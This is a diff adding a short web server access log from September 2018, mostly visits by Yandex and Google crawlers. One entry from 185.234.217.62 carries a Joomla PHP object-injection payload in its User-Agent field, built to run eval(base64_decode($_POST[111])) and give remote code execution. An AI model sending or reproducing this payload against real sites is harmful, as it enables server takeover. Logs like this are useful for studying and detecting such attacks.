@@ -1,0 +1,9 @@
+IP: 185.234.217.62 TIME: Sep 18 2:16:00 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+IP: 185.234.217.62 TIME: Sep 18 2:16:00 2018 REFERRER:  SEARCHSTRING:  USERAGENT: }__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:54:"eval(base64_decode($_POST[111]));JFactory::get();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}𝌆
+IP: 185.234.217.62 TIME: Sep 18 2:16:00 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+IP: 141.8.142.131 TIME: Sep 18 7:57:48 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+IP: 5.255.253.35 TIME: Sep 18 7:57:49 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+IP: 66.249.93.221 TIME: Sep 18 11:17:16 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon
+IP: 37.9.113.173 TIME: Sep 18 13:33:54 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+IP: 141.8.142.25 TIME: Sep 18 13:33:54 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+IP: 178.154.200.22 TIME: Sep 18 17:30:48 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
